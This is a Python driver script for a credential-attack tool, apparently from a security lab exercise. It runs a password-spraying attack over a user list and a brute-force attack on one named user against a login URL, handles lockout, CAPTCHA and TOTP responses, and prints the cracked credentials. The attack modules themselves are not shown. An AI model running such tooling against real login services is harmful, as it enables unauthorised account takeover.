from config import *
from utils.files import load_file
from utils.timer import Timer
from core.client import HttpClient
from core.user import TargetUserState
from attacks.password_spray import PasswordSprayAttack
from attacks.brute_force import BruteForceAttack

def main():
    passwords = load_file(PASSWORDS_FILE)

    timer = Timer()
    client = HttpClient(URL,CAPTCHA_URL,GROUP_SEED,REQUEST_TIMEOUT)

    if APPLY_PASSWORD_SPRAY:
        users = [TargetUserState(u) for u in load_file(USERS_FILE)]
        print("Starting Password Spraying Attack:")
        PS_attack = PasswordSprayAttack(
            client=client,
            timer=timer,
            success_code=SUCCESS_CODE,
            lockout_code=LOCKED_CODE,
            captcha_code=CAPTCHA_CODE,
            totp_code = TOTP_CODE,
            max_time=MAX_ATTACK_TIME,
            max_attempts=MAX_ATTEMPTS,
            users=users,
            passwords=passwords
        )
        PS_attack.run()  
        print("Password Spraying Attack finished")
        for user, (password, t) in PS_attack.hacked.items():
            print(f"{user:<20} {password:<20} {t:.2f}s")


    if APPLY_BRUTE_FORCE:
        print(f"Staring Brute Force Attack on user: {USER_TO_BRUTE_FORCE}:")
        BF_attack = BruteForceAttack(
            client=client,
            timer=timer,
            success_code=SUCCESS_CODE,
            lockout_code = LOCKED_CODE,
            captcha_code=CAPTCHA_CODE,
            totp_code = TOTP_CODE,
            max_time=MAX_ATTACK_TIME,
            max_attempts=MAX_ATTEMPTS,
            user=TargetUserState(USER_TO_BRUTE_FORCE),
            passwords=passwords
            )
        BF_attack.run()
        print("Brute Force Attack finished")
        for user, (password, t) in BF_attack.hacked.items():
            print(f"{user:<20} {password:<20} {t:.2f}s")
        

if __name__ == "__main__":
    main()
